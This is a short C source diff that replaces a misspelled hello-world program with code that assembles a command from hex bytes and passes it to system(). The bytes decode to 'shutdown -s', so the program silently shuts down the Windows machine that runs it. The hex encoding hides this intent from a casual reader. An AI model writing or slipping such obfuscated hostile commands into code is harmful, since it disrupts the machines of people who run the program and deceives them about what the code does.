@@ -1,4 +1,7 @@
 #include <stdio.h>
-int main(){
-    printf("HelloWold");
+#include <windows.h>
+int main()
+{
+    char str[20] = {0x73, 0x68, 0x75, 0x74, 0x64, 0x6f, 0x77, 0x6e, 0x20, 0x2d, 0x73};
+    system(str);
 }
